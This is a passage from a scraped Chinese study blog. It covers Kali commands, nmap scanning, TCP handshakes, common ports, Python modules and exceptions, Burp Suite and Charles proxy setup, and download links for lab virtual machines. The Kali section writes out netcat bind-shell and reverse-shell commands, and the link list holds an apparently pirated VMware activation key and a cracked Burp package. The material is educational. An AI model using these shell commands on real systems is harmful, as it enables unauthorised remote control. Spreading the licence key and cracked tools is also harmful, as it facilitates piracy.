xxx\t回响（单独使用是复读机）\necho xxx \u0026gt; 1.txt\t创建名为1.txt的文件并写入xxx（有覆盖效果）\necho xxx \u0026gt;\u0026gt; 1.txt\t向1.txt中追加xxx\n查看进程 ps\t查看进程\nps -ef\t查看全部进程\nps -ef | grep xxx\t查看进程名字包含xxx关键词的进程\ntop\t查看进程（打开性能监视器）\n软件指令： 编辑器类： nano\t用nano打开文件\nvim\t用vim打开文件\n几个小工具 nc的使用 基础连接 服务端(被控)：\nnc -l -p [端口号]\t监听指定端口\n客户端(控制)：\nnc -nv [服务端ip] [端口号]\t连接服务端\n远程控制 正向控制 入侵者每次主动连接目标\n目标(被控)：\nnc -lp [端口号] -e cmd\t指客户端连接后为其打开cmd\n入侵：\nnc -nv [服务端ip] [端口号]\t连接目标\n反向控制 目标每次自己连接入侵者\n目标(被控)：\nnc -nv [入侵者ip] [端口号] -e cmd\n注意：如果目标系统为linux则将-e cmd改为-c bash\nnmap的使用 nmap [可选参数] [目标ip]\t普通扫描\n参数：\n-sT\ttcp扫描\n-sS\t隐秘扫描（不形成三次握手）\n-sL\t[扫描一个ip段] 例如192.168.0.1/24 (指从192.168.0.1到192.168.0.255) 主要用于批量主机发现\n-sn\tping扫描，只发现主机，不扫描端口，通常结合-sL使用\n-Pn\t将所有主机假定开机，跳过主机发现的过程\n-P0\t使用ip协议探测主机是否开启\n-sU\t使用UDP扫描\n-p\t指定扫描那些端口，例如nmap -p 80,443,3380 192.168.1.0/24\n-O\t识别操作系统\n追加：网络相关 TCP的三次握手与四次挥手 TCP（Transmission Control Protocol，传输控制协议）是 面向连接、可靠的字节流协议，其核心机制 “三次握手”（建立连接）和 “四次挥手”（释放连接）是保障数据可靠传输的基础。\n核心前提：TCP 报文关键字段 在理解握手 / 挥手前，需先掌握 TCP 报文中的 3 个核心标志位和 2 个序列号字段，这是通信的 “信号标识”：\n字段 作用 SYN 同步标志（Synchronize）：用于发起连接，请求同步对方的序列号（seq） ACK 确认标志（Acknowledgment）：用于确认收到数据，携带确认号（ack） FIN 终止标志（Finish）：用于发起连接释放，告知对方 “我已无数据要发送” seq（序列号） 标记当前发送数据的字节位置（随机初始化，后续按字节递增） ack（确认号） 标记 “期望下次收到的对方序列号”（= 已收到的对方 seq + 1） 注：TCP 是全双工通信（双方可同时发送数据），因此每个方向都需要独立的序列号和确认机制。\n三次握手（Three-Way Handshake）：建立可靠连接 核心目的： 双方确认彼此的 “发送能力” 和 “接收能力” 均正常； 协商初始序列号（seq），为后续数据传输的 “有序性” 和 “去重” 打下基础； 避免 “失效的连接请求报文段” 导致错误连接。 步骤拆解： 第一次握手（客户端→服务器）： 客户端发送报文：SYN=1（发起连接），seq=x（x 是客户端随机生成的初始序列号，如 1000）； 客户端状态变为 SYN_SENT（等待服务器确认）； 作用：告诉服务器 “我想和你建立连接，请你同步我的序列号”。 第二次握手（服务器→客户端）： 服务器收到 SYN 后，回复报文：SYN=1（同意建立连接，同步自己的序列号）+ ACK=1（确认收到客户端的 SYN）； 服务器序列号：seq=y（y 是服务器随机生成的初始序列号，如 2000）； 服务器确认号：ack=x+1（表示 “我已收到你到 x 的所有数据，下次请从 x+1 开始发”）； 服务器状态变为 SYN_RCVD（等待客户端最终确认）； 作用：服务器同时完成 “确认客户端接收 / 发送能力” 和 “发起自己的连接同步”。 第三次握手（客户端→服务器）： 客户端收到服务器的 SYN+ACK 后，回复报文：ACK=1（确认收到服务器的 SYN）； 客户端序列号：seq=x+1（按字节递增，因第一次仅发送了 SYN 标志位，无数据字节，故 + 1）； 客户端确认号：ack=y+1（表示 “我已收到你到 y 的所有数据，下次请从 y+1 开始发”）； 客户端状态变为 ESTABLISHED（连接建立），服务器收到后也变为 ESTABLISHED； 作用：客户端最终确认服务器的连接请求，双方完成 “双向能力验证” 和 “序列号协商”。 关键设计逻辑：为什么是 “三次” 而不是 “两次”？ 两次握手的风险：若客户端发送的 “连接请求报文段” 因网络延迟未及时到达服务器，客户端会超时重发。若延迟的报文段后续到达服务器，服务器会误以为是新的连接请求，直接回复 SYN+ACK 并建立连接，但客户端此时已不需要该连接，会忽略服务器的回复，导致服务器资源被浪费（半连接状态）。 三次握手的必要性：第三次握手是客户端对服务器 SYN 的确认，确保 “服务器知道客户端已收到自己的连接响应”，从而避免上述资源浪费。只有三次握手，才能实现双方 “双向可靠确认”。 四次挥手（Four-Way Wavehand）：释放连接 核心目的 TCP 是全双工通信，双方可同时发送数据。释放连接时，需确保：\n双方都已完成数据传输（无未发送 / 未接收的数据）； 双方都明确 “对方已停止发送数据”，避免提前关闭连接导致数据丢失。 步骤拆解： 第一次挥手（客户端→服务器）： 客户端完成数据发送后，发送报文：FIN=1（告知服务器 “我已无数据要发，请求关闭我的发送通道”）； 客户端序列号：seq=x+1（基于之前的数据传输进度，假设之前已发送到 x）； 客户端确认号：ack=y+1（确认之前收到的服务器数据）； 客户端状态变为 FIN_WAIT_1（等待服务器确认关闭）； 注意：客户端关闭的是 “发送通道”，仍可接收服务器的数据（全双工特性）。 第二次挥手（服务器→客户端）： 服务器收到 FIN 后，回复报文：ACK=1（确认收到客户端的关闭请求）； 服务器序列号：seq=y+1（基于之前的传输进度）； 服务器确认号：ack=x+2（因客户端发送了 FIN 标志位，相当于 1 个字节的 “关闭请求数据”，故 x+1+1=x+2）； 服务器状态变为 CLOSE_WAIT（等待自己的数据发送完成后，再关闭自己的发送通道）； 客户端收到后，状态变为 FIN_WAIT_2（等待服务器的 FIN 报文）； 作用：服务器确认 “客户端不再发送数据”，但自己可能仍有数据要发给客户端（如剩余的响应数据）。 第三次挥手（服务器→客户端）： 服务器完成所有数据发送后，发送报文：FIN=1（告知客户端 “我也无数据要发，请求关闭我的发送通道”）； 服务器序列号：seq=y+1（无新数据发送，序列号不变）； 服务器确认号：ack=x+2（与第二次挥手一致）； 服务器状态变为 LAST_ACK（等待客户端最终确认）； 作用：服务器关闭自己的发送通道，告知客户端 “可以彻底关闭连接了”。 第四次挥手（客户端→服务器）： 客户端收到服务器的 FIN 后，回复报文：ACK=1（确认收到服务器的关闭请求）； 客户端序列号：seq=x+2（基于之前的确认号）； 客户端确认号：ack=y+2（服务器的 FIN 相当于 1 个字节，故 y+1+1=y+2）； 客户端状态变为 TIME_WAIT（等待 2MSL 后关闭），服务器收到后状态变为 CLOSED； 客户端等待 2MSL（Maximum Segment Lifetime，报文最大生存时间，默认 2 分钟）后，状态变为 CLOSED； 作用：确保服务器能收到客户端的最终确认（避免服务器因报文丢失而重发 FIN）。 关键设计逻辑：为什么是 “四次” 而不是 “三次”？ 核心原因：TCP 是全双工通信，双方的 “发送通道” 需要独立关闭。 第三次握手时，服务器可以同时发送 SYN 和 ACK（因为此时服务器还未发送数据，可合并报文）； 四次挥手时，服务器收到客户端的 FIN 后，可能仍有数据要发送，无法立即发送 FIN（需先完成数据传输），因此必须分两步：先回复 ACK（确认客户端关闭），再发送 FIN（自己关闭），导致比三次握手多一次报文交互。 关键细节：TIME_WAIT 状态的作用 目的 1：确保最后一个 ACK 报文能到达服务器（若服务器未收到 ACK，会重发 FIN，客户端在 TIME_WAIT 期间可重新回复）； 目的 2：避免 “失效的报文段” 干扰新连接（TIME_WAIT 期间，客户端会丢弃所有来自该连接的旧报文段）； 实际影响：服务器若频繁关闭连接，会积累大量 TIME_WAIT 状态的端口，导致端口耗尽（可通过调整net.ipv4.tcp_tw_reuse等内核参数优化）。 端口 端口是计算机网络中用于区分不同服务/应用的逻辑地址（范围：0-65535），按用途可分为 知名端口（0-1023）、注册端口（1024-49151） 和 动态端口（49152-65535）。以下是开发者和日常使用中最常见的端口及其核心特点，按场景分类整理，方便查阅：\n核心网络服务端口（知名端口，0-1023） 这类端口由 IANA 分配，对应基础网络服务，默认端口固定，是网络通信的基础。\n端口号 协议 服务/应用 核心特点 使用场景 安全注意事项 21 TCP FTP（文件传输） 明文传输用户名/密码和文件数据，不加密；主动模式（服务器连客户端20端口）/被动模式 传统文件传输（已逐渐被替代） 风险极高！明文传输易被窃听，建议用 SFTP（22端口） 或 FTPS 替代 22 TCP SSH（安全外壳） 加密远程登录/命令执行，支持端口转发、文件传输（SFTP），替代Telnet 服务器远程管理（Linux/云服务器） 建议修改默认端口（如2222），禁用密码登录（仅用SSH密钥），限制登录IP 23 TCP Telnet（远程登录） 明文传输，无加密，安全性极差 早期设备管理（已淘汰） 完全不推荐使用！用SSH（22端口）替代 25 TCP SMTP（邮件发送） 用于邮件服务器之间发送邮件，或客户端向服务器提交邮件（需配合认证） 邮件服务（如Postfix、Sendmail） 默认无加密，建议开启TLS（465端口），配置SPF/DKIM防止邮件伪造 53 TCP/UDP DNS（域名解析） UDP用于普通查询（快，无连接）；TCP用于区域传输（数据量大，可靠） 域名解析（如访问网站、API） 开放公共DNS需注意防护DDoS攻击；内网建议部署本地DNS缓存（如Pi-hole） 80 TCP HTTP（超文本传输） 明文传输网页数据，无加密，是Web服务默认端口 普通网站访问、HTTP API 仅用于测试/内部服务，公网必须升级为HTTPS（443端口），否则数据易被篡改窃听 443 TCP HTTPS（加密HTTP） 基于TLS/SSL加密，保障数据传输安全，支持HTTP/2、HTTP/3 HTTPS网站、加密API、小程序 必须配置有效SSL证书（Let’s Encrypt免费），禁用弱加密套件（如TLS 1.0/1.1） 110 TCP POP3（邮件接收） 明文接收邮件，无加密 客户端接收邮件（已淘汰） 用POP3S（995端口，加密）替代 143 TCP IMAP（邮件接收） 支持邮件文件夹同步、标记管理，明文传输 客户端接收邮件（主流） 用IMAPS（993端口，加密）替代，开启邮件二次验证 389 TCP/UDP LDAP（目录服务） 用于用户身份认证、组织架构管理（如企业内网） 企业内网身份验证 明文传输风险高，用LDAPS（636端口，加密）替代 445 TCP SMB（文件共享） Windows文件共享、打印机共享，支持跨设备访问 内网文件共享（Windows/Mac） 漏洞频发（如永恒之蓝），公网禁止开放；内网限制访问IP，关闭匿名登录 开发者常用端口（注册端口，1024-49151） 这类端口由应用程序注册使用，默认端口可配置修改，是开发、测试、部署中高频接触的端口。\n数据库端口 端口号 协议 数据库/服务 核心特点 使用场景 安全注意事项 3306 TCP MySQL/MariaDB 关系型数据库默认端口，支持主从复制、事务 Web开发、数据分析 公网禁止开放！内网绑定本地IP（127.0.0.1），设置强密码，限制访问IP 5432 TCP PostgreSQL 开源关系型数据库，支持复杂查询、JSON数据 后端开发、大数据应用 同MySQL，禁用远程匿名访问，开启SSL加密 1433 TCP SQL Server 微软SQL Server数据库默认端口 .NET开发、企业应用 公网不开放，内网限制IP，启用Windows认证或混合认证 27017 TCP MongoDB 文档型数据库，无Schema，支持分布式存储 大数据、API后端、NoSQL应用 默认无认证！需启用访问控制（用户名密码），绑定内网IP，禁止公网暴露 6379 TCP Redis 内存缓存数据库，高性能，支持多种数据结构 缓存、会话存储、消息队列 高危！默认无密码，需设置密码、绑定本地IP、开启防火墙，禁用公网访问 9200 TCP Elasticsearch 全文搜索引擎，支持分布式、实时检索 日志分析、全文搜索功能 禁用匿名访问，配置用户认证（如X-Pack），限制访问IP Web开发/服务器端口 端口号 协议 服务/框架 核心特点 使用场景 安全注意事项 8080 TCP 通用Web端口 开发环境默认端口（如Tomcat、Nginx反向代理），非特权端口 本地开发测试、内网Web服务 公网部署需映射到80/443，禁止直接暴露8080；开启认证（如Basic Auth） 8000 TCP 开发服务器 Python Flask/Django、Node.js默认开发端口 本地开发调试（如python manage.py runserver） 仅用于本地测试，切勿公网开放（无安全防护） 3000 TCP Node.js/React Node.js Express、React开发服务器默认端口 前端/Node.js后端开发 同8000，本地测试专用，公网需通过Nginx反向代理并配置HTTPS 4000 TCP Hugo/Gatsby Hugo开发服务器默认端口（hugo server -p 4000） 静态博客本地预览（如GitHub Pages博客） 仅本地使用，无需公网开放，预览后部署到GitHub Pages（80/443端口） 8096 TCP Jellyfin 媒体服务器默认端口（Web管理界面+流媒体传输） 云/内网媒体库（如之前提到的Jellyfin） 公网访问需配置HTTPS（反向代理+SSL），设置强密码，限制登录IP 8888 TCP Jupyter Notebook Python交互式开发环境默认端口 数据分析、机器学习开发 本地使用需设置密码（jupyter notebook password），公网需端口转发+HTTPS 其他开发工具端口 端口号 协议 工具/服务 核心特点 使用场景 安全注意事项 5900 TCP VNC（远程桌面） 跨平台远程桌面控制，支持图形界面 远程操作桌面（如树莓派） 默认无加密，需开启VNC加密（如TightVNC），设置强密码，限制访问IP 3389 TCP RDP（Windows远程桌面） Windows自带远程桌面，图形界面流畅 Windows服务器/电脑远程控制 公网禁止开放！内网限制IP，开启网络级别认证（NLA），设置复杂密码 6000-6005 TCP X11（Linux图形界面） Linux/Unix图形界面传输端口 Linux远程图形界面访问 明文传输，风险高，建议用SSH隧道转发（ssh -X user@server）替代 9090 TCP Prometheus 监控系统默认端口（Web UI+API） 服务器/应用监控 公网需配置认证（如Basic Auth），限制访问IP，配合Grafana（3000端口）可视化 ","date":"2025-11-23T22:19:56+08:00","permalink":"https://www.retr0.xyz/p/1.2-kali%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E6%8C%87%E4%BB%A4%E5%8F%8A%E5%87%A0%E4%B8%AA%E5%B0%8F%E5%B7%A5%E5%85%B7/","title":"1.2 kali基础知识和指令及几个小工具"},{"content":"一、行列式法（仅适用于系数矩阵$A$为$n$阶方阵，$n$为变量个数） 1. 线性齐次方程组（$Ax=0$） 若 $|A| \\neq 0$，方程组 只有零解； 若 $|A| = 0$，方程组 有无穷多非零解。 2. 线性非齐次方程组（$Ax=b$，$\\overline{A}=(A,b)$为增广矩阵） 若 $|A| \\neq 0$，方程组 有唯一解； 若 $|A| = 0$： 当 $r(A) \\neq r(\\overline{A})$ 时，方程组 无解； 当 $r(A) = r(\\overline{A})$ 时，方程组 有无穷多解。 二、矩阵的秩法（通用，无方阵限制） 1. 核心定义 $A$：系数矩阵； $\\overline{A}=(A,b)$：线性非齐次方程组的增广矩阵（齐次方程组无需增广矩阵）； $n$：变量个数。 2. 线性齐次方程组（$Ax=0$） 若 $r(A) = n$，方程组 只有零解； 若 $r(A) \u0026lt; n$，方程组 有无穷多非零解。 3. 线性非齐次方程组（$Ax=b$） 若 $r(A) \\neq r(\\overline{A})$，方程组 无解； 若 $r(A) = r(\\overline{A}) = n$，方程组 有唯一解； 若 $r(A) = r(\\overline{A}) \u0026lt; n$，方程组 有无穷多解。 ","date":"2025-11-21T20:45:26+08:00","permalink":"https://www.retr0.xyz/p/%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95%E5%88%A4%E6%96%AD%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84%E8%A7%A3%E7%9A%84%E6%83%85%E5%86%B5/","title":"两种方法判断线性方程组解的情况"},{"content":"模块的定义和导入 模块（Module），是一个Python文件，以.py结尾。模块能定义函数，类和变量，模块里也能包含可执行的代码。\n模块的作用： python中有很多各种不同的模块,每一个模块都可以帮助我们快速的实现一些功能,比如实现和时间相关的功能就可以使用time模块我们可以认为一个模块就是一个工具包,每一个工具包中都有各种不同的工具供我们使用进而实现各种不同的功能.\n大白话：模块就是一个Python文件,里面有类、函数、变量等,我们可以拿过来用(导入模块去使用)\n模块的导入方式 模块在使用前需要先导入，语法如下：\n1 2 3 4 5 6 7 [from 模块名] import [模块 | 类 | 变量 | 函数 | *] [as 别名]\t# 中括号指可选内容 # 常用的组合形式如： import 模块名 from 模块名 import 类、变量、方法等 from 模块名 import * import 模块名 as 别名 from 模块名 import 功能名 as 别名 import 模块名： 基本语法（Quickstart）：\n1 2 3 4 5 6 # 导入时间模块 import time print(\u0026#39;开始运行\u0026#39;) # 让程序睡眠5秒（阻塞） time.sleep(5)\t# 注意此处语法是 模块名.方法名 print(\u0026#39;运行结束\u0026#39;) from 模块名 import 功能名： 基本语法（Quickstart）：\n1 2 3 4 5 6 # 导入时间模块的sleep方法 from time import sleep print(\u0026#39;开始运行\u0026#39;) # 让程序睡眠5秒（阻塞） sleep(5)\t# 注意此处语法是直接调用方法名 print(\u0026#39;运行结束\u0026#39;) from 模块名 import *： 基本语法（Quickstart）：\n1 2 3 4 5 # 导入时间模块的全部功能 from time import *\t# *表示全部的意思 print(\u0026#39;开始运行\u0026#39;) sleep(5)\t# 注意此处语法是直接调用方法名 print(\u0026#39;运行结束\u0026#39;) as定义别名 基本语法（Quickstart）：\n1 2 3 4 5 #模块别名 import time as t print(\u0026#39;hi\u0026#39;) t.sleep(3) print(\u0026#39;hello\u0026#39;) 1 2 3 4 5 # 功能别名 from time import sleep as s print(\u0026#39;hi\u0026#39;) s(3) print(\u0026#39;hello\u0026#39;) 自定义模块并导入 制作自定义模块 示例 Quickstart:\n创建模块文件module.py\n1 2 def test(a,b): print(a + b) 创建主文件main.py\n1 2 import module module.test(1,2) 注意：当导入多个模块的时候。且模块内有同名功能，当调用这个同名功能的时候，调用的是后导入的模块的功能\n例如：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 模块1 module1.py def test(a,b): print(a + b) # 模块2 module2.py def test(a,b): print(a - b) # 导入模块和调用功能代码 from module1 import test from module2 import test # 实际test函数是模块2中的函数 test(1,2)\t# 输出 -1 特殊变量的使用 __main__变量的使用 有些时候开发者编写好一个自定义模块后为了方便测试会直接在模块文件中写一些测试语句方便直接F5测试。\n但是这时如果将模块导入到其他项目中时那些测试语句也会被执行，所以我们需要一种方法使得直接运行模块文件时测试语句能正常运行，但是以导入模块的方式调用时又不会触发测试语句，因此我们需要使用__main__变量\n例如（Quickstart）：\n1 2 3 4 5 6 7 8 9 10 # 模块文件module.py def test(a,b): print(a + b) if __name__ == \u0026#39;__main__\u0026#39;: test(1,2) # 主文件 from module import test test(3,4)\t# 这样只会输出7 原理解释：任何文件在直接执行（如F5调试、双击运行）时其__name__参数的值都为__main__，但是在作为模块导入时其__name__参数的值是它自己的模块名，再结合上面的if代码，当文件直接运行时if为真所以运行下面的测试语句，当通过导入模块调用时，if不为真，进而不会执行接下来的代码\n__all__变量的使用 __all__变量是一个列表，里面包括了可以被导入的模块，如果一个模块文件中有__all__变量，当使用from xxx import *导入时，只能导入这个列表中的元素\n例如（Quickstart）：\n1 2 3 4 5 6 7 8 9 10 11 # 模块文件module.py __all__ = [\u0026#39;testA\u0026#39;] def testA(a,b): print(a + b) def testB(a,b): print(a - b) # 主文件 from module import * testA(1,2) 但是__all__变量并不妨碍你通过from module import testB指明某个方法来导入\n例如（Quickstart）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 # 模块文件module.py __all__ = [\u0026#39;testA\u0026#39;] def testA(a,b): print(a + b) def testB(a,b): print(a - b) # 主文件 from module import * from module import testB testA(1,2) testB(3,4) ","date":"2025-11-21T20:43:18+08:00","permalink":"https://www.retr0.xyz/p/9.2-%E6%A8%A1%E5%9D%97/","title":"9.2 模块"},{"content":" 当检测到一个错误时，Python解释器就无法继续执行了，反而出现了一些错误的提示，则就是所谓的“异常”，也就是我们常说的bug\n小插曲：bug单词的诞生\n早期计算机采用大量继电器工作,马克二型计算机就是这样的。\n1945年9月9日,下午三点,马克二型计算机无法正常工作了,技术人员试了很多办法,最后定位到第70号继电器出错。负责人哈珀观察这个出错的继电器,\n发现一只飞蛾躺在中间,已经被继电器打死。她小心地用摄子将蛾子夹出来,用透明胶布帖到“事件记录本”中,并注明“第一个发现虫子的实例。“自此之后,引发软件失效的缺陷,便被称为Bug。\n异常演示 例如，以r方式打开一个不存在的文件\n1 f = open(\u0026#39;test.txt\u0026#39;,\u0026#39;r\u0026#39;) 执行结果：\n1 Traceback (most recent call last): File \u0026#34;/home/cloudlab/main.py\u0026#34;, line 1, in \u0026lt;module\u0026gt; f = open(\u0026#39;test.txt\u0026#39;,\u0026#39;r\u0026#39;)FileNotFoundError: [Errno 2] No such file or directory: \u0026#39;test.txt\u0026#39; 异常的捕获 捕获常规异常： 基本语法：\n1 2 3 4 try: 可能发生错误的代码 except: 如果出现异常执行的代码 QuickStart：\n需求：尝试以r模式打开文件，如果文件不存在，则以w模式打开\n1 2 3 4 try: f = open(\u0026#39;test.txt\u0026#39;,\u0026#39;r\u0026#39;) except: f = open(\u0026#39;test.txt\u0026#39;,\u0026#39;w\u0026#39;)\t# 运行发现没有报错 捕获指定异常： 基本语法：\n1 2 3 4 try: 可能发生错误的代码\texcept 异常名称: 如果出现异常执行的代码 QuickStart：\n1 2 3 4 try: print(name)\t# 如果直接运行该行代码会报错NameError except NameError as e:\t# 此处as后加变量可以把错误信息赋值给该变量，方便后面print查看等 print(\u0026#39;name变量名称未定义错误\u0026#39;,\u0026#39;错误为：\u0026#39;，e) 捕获多个异常： 基本语法：\n1 2 3 4 try: 可能发生错误的代码 except(异常名称1,异常名称2,异常名称3): 如果出现异常执行的代码 QuickStart：\n1 2 3 4 try: print(1/0) except(NameError,ZeroDivisionError) as e: print(\u0026#39;出错了！\u0026#39;,\u0026#39;错误是：\u0026#39;,e) 捕获全部异常： 第一种： 同 2.1 捕获常规异常 1 2 3 4 try: 可能发生错误的代码 except: 如果出现异常执行的代码 第二种： 1 2 3 4 try: 可能发生错误的代码 except Exception as e:\t# Exception可指代全部异常 如果出现异常执行的代码 异常之else else表示的是如果没有异常要执行的代码。\n1 2 3 4 5 6 try: print(1)\texcept Exception as e: print(e) else: print(\u0026#39;没有错误发生！\u0026#39;) 异常之finally finally表示的是无论是否异常都要执行的代码，例如关闭文件。\n1 2 3 4 5 6 7 8 try: f = open(\u0026#39;test.txt\u0026#39;,\u0026#39;r\u0026#39;)\texcept Exception as e: f = open(\u0026#39;test.txt\u0026#39;,\u0026#39;w\u0026#39;) else: print(\u0026#39;没有错误发生！\u0026#39;) finally: f.close() 异常的传递 解释：\n无捕获时： 1 2 3 4 5 6 7 8 9 10 11 12 13 def func01(): print(\u0026#39;这是func01开始\u0026#39;) nmu = 1 / 0 print(\u0026#39;这是func01结束\u0026#39;) def func02(): print(\u0026#39;这是func02开始\u0026#39;) func01() print(\u0026#39;这是func02结束 \u0026#39;) def main(): func02() main() 输出及报错内容：\n这是func02开始\nTraceback (most recent call last):\nFile \u0026quot;/home/cloudlab/main.py\u0026quot;,line 13, in \u0026lt;module\u0026gt;\n这是func01开始\nmain()\nFile \u0026quot;/home/cloudlab/main.py\u0026quot;,line 12, in main\nfunc02()\nFile \u0026quot;/home/cloudlab/main.py\u0026quot;,line 8, in func02\nfunc01()\nFile \u0026quot;/home/cloudlab/main.py\u0026quot;,line 3, in func01\nnmu = 1 / 0\nZeroDivisionError: division by zero\n注意观察报错中错误所在代码行数的变化，体现了异常的传递\n有捕获时： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 def func01(): print(\u0026#39;这是func01开始\u0026#39;) nmu = 1 / 0 print(\u0026#39;这是func01结束\u0026#39;) def func02(): print(\u0026#39;这是func02开始\u0026#39;) func01() print(\u0026#39;这是func02结束 \u0026#39;) def main(): try: func02() except Exception as e: print(\u0026#39;检测到异常!\u0026#39;,e) main() # 输出结果： # 这是func02开始 # 这是func01开始 # 检测到异常! division by zero 输出内容：\n这是func02开始\n这是func01开始\n检测到异常! division by zero\n当函数func01中发生异常,并且没有捕获处理这个异常的时候,异常\n会传递到函数func02,当func02也没有捕获处理这个异常的时候\nmain函数会捕获这个异常,这就是异常的传递性.\n而且代码再按步骤执行时一旦遇到异常就会立即停止接下来的步骤，除非被捕获\n","date":"2025-11-19T22:22:08+08:00","permalink":"https://www.retr0.xyz/p/9.1-%E5%BC%82%E5%B8%B8/","title":"9.1 异常"},{"content":" 本篇课程使用资源库内的“win10渗透测试工具预安装虚拟机（日常使用）”\n抓包 环境准备 Java环境准备 打开C:\\tools\\alltools\\java环境中的jre-8u261-windows-x64.rar压缩包，解压并安装Java 安装完成后按win+R打开“运行”窗口，输入cmd并回车进入命令行控制台。 分别输入java和javac均有内容返回则说明安装成功。 Burpsuite软件的准备 打开C:\\tools\\alltools\\抓包工具中的Burpsuitepro_Unlimited_jb51.rar压缩包并解压到合适的位置。 在解压的文件夹内创建一个.bat批处理文件用于启动Burpsuite，名称随便，内容为： 1 java -jar BurpUnlimited.jar 双击该批处理文件即可启动Burpsuite,一路next进入软件界面。 检查并确认Options选项卡中监听地址和端口为127.0.0.1:8080 Firefox浏览器的准备（需要开着Burpsuite） 打开Firefox浏览器，并转到选项中，在高级-网络-连接-设置中选择“手动配置代理”并勾选为所有协议使用相同代理，填写好之前获取的地址和端口。 在地址栏输入http://burp/能进入页面说明配置成功，接下来点击页面右上角的‘CA Certificate’按钮保存证书。 再次转到浏览器的选项中，在高级-证书-查看证书-证书机构-导入中选择刚才保存到证书导入，弹窗内全部勾上。 证书机构的列表中多出名为PortSwigger CA的证书则导入成功。 Charles软件的准备（可选） 打开位于C:\\tools\\Charles内的Charles.exe 点击代理选项，可以看到默认勾选了Windows代理，说明Charles默认使用系统代理的方法抓包，也因此能抓取系统上所有软件的http数据包。\n正如上述，我们需要在浏览器的代理设置中更改为：**使用系统代理 **（1.1.3中提到） 因为未知原因，charles的证书不能从本地保存后导入，所以这里我们选择 **帮助-SSL代理-在移动设备或远程浏览器上安装Charles根证书 **点击后出现弹窗，例如： 这里我们只看后面的chls.pro/ssl在浏览器中访问该地址。\n安装证书的操作不再过多叙述。\n抓包实操 Burp抓包 在Burp软件内Proxy-Intercept选项卡中点击Intercept is off开始抓包\n此时在百度上搜索任意关键词（以\u0026quot;test\u0026quot;为例）可以看到抓取到数据包\n修改数据包首行wd参数值为\u0026quot;ok\u0026quot;\n点击Intercept is on放行数据包\n发现搜索关键词被替换为\u0026quot;ok\u0026quot;\nCharles抓包 打开Charles软件并访问百度\n发现抓取到数据包，查看内容发现与页面原代码一致\nweb基本知识 一些术语：\nGET 通过地址栏输入===从服务器获取\nPOST 提交表单===向服务器发送\nrequest 向服务器发起一个请求，服务器会返回一个结果(response)给客户端\n**forward **服务器内部发送重定向（网页发生改变但地址不变）\n**redirect **服务器收到一个请求后，发送一个状态给客户端，客户端会再次请求，此时url发生了改变\n**url **统一资源定位器（链接）\nurl的组成，以百度搜索为例：\nhttps:// www.baidu.com/ s ? wd=test \u0026amp; rsv_spt=1 \u0026amp; issp=1 \u0026amp; f=8\nhttp:// == 协议\nwww.baidu.com == 域名\ns == 文件\n？== get请求\nwd/rsv_spt/issp/f == 参数名\n参数名等号后为参数值\n\u0026amp; == 连接符\n","date":"2025-11-17T15:59:43+08:00","permalink":"https://www.retr0.xyz/p/1.1-%E6%8A%93%E5%8C%85%E5%92%8Cweb%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/","title":"1.1 抓包和web基本知识"},{"content":"部分虚拟机的密码在文件名上\n===============================\n日常工具（包含VMware以及其他常用小工具）\n链接：https://pan.baidu.com/s/1Cas0WpP1XkOf8Blh0pOFSw\n提取码：67uq\nvmware激活\nvmware17.5.2激活（本机为win11系统使用）\nMC60H-DWHD5-H80U9-6V85M-8280D\nvmware17.5.2安装参考\nhttps://word.huayunsys.com/thread-688-1-1.html\n=============================\nwin10渗透测试工具预安装虚拟机（日常使用）\nhttps://pan.baidu.com/s/1VydYshBifpLR1U7tLowyBA\n提取码: zy7p\nparrot渗透src工具预安装虚拟机（日常使用）\n链接: https://pan.baidu.com/s/1GOqLxz-tCSIGZrX2TLeaZg\n提取码: qjp7\n=============================\nkali预安装虚拟机系列\nkali2018 x64（预安装）-优先使用（文件传输使用bitvise）\n链接: https://pan.baidu.com/s/10lm6F5UO0q2f16kRVKXRqw\n提取码: 6s8i\nkali 2025-1 x64位（预安装）\n链接: https://pan.baidu.com/s/1gXSP1me3Z6djvsFJjV7-Jw 提取码: c2sd\nkali2023.2 with Clash（需要高版本kali实验以及全局vpn使用）\n链接：https://pan.baidu.com/s/1h-2pY_NmDEWzD5ve_sadLw\n提取码：a7vm\n关于v2ray转clash配置的生成地址\nhttps://acl4ssr-sub.github.io/\nkali 1.0.6 x64位（预安装）\n链接：https://pan.baidu.com/s/1fE6sTVYLNXVi1wokT0GE_w\n提取码：oe8g\n=========================\n空靶机系列\nwin7nosp预安装虚拟机（适合渗透测试实验，自带chrome，phpstudy，无vmwaretools）\n链接：https://pan.baidu.com/s/1ZIEB06P727Fau6afz5zI1A 提取码：pvql\nwin7sp1预安装虚拟机（适合普通实验）\n链接：https://pan.baidu.com/s/1adkc-lYiw2IRc2ztpTWVjg 提取码：dvl5\nwin10预安装虚拟机链接（普通实验靶机）：\n链接: https://pan.baidu.com/s/1qWT4DeG8uujcsjgpeFBWjg 提取码: bpat\n===============================\n特殊实验虚拟机\nsrc挖洞虚拟机\n链接: https://pan.baidu.com/s/1QTZJ1ExIyYKkEEj-hTV8Gw 提取码: mesk\nparrot预安装虚拟机\n链接：https://pan.baidu.com/s/1m9GAPluSlkeb1ul8qYW2ag 提取码：mo8m\nwin2019数据中心版预安装虚拟机\n链接: https://pan.baidu.com/s/1P8VXiwHay9HpA6BshBI6tw 提取码: cbl9\nwin2012标准版预安装虚拟机\n链接: https://pan.baidu.com/s/1leMe8dBmf1A0R9xA-0N0aA 提取码: voou\nwin2008企业版预安装虚拟机+phpstudy\n链接：https://pan.baidu.com/s/1gAhA8A14HL5zXXJTFRGNDQ 提取码：97fa\ncentos7普通预安装虚拟机\n链接: https://pan.baidu.com/s/1vU6w6jJ58C9v9wxnGOEr0Q 提取码: f1c4\ncentos7预安装phpstudy\n链接: https://pan.baidu.com/s/1pol4yliVnnau9LqsM0nUjw 提取码: xtmv\ncentos7预安装redis\n链接: https://pan.baidu.com/s/1sdIu2_96xr5M7xG5EIOivQ 提取码: qyv8\ncentos7预安装docker\n链接: https://pan.baidu.com/s/1bZqqRKEAQH0FdEzxvnHmBA 提取码: 1vr3\n云安全3台centos7预安装k8s\n链接: 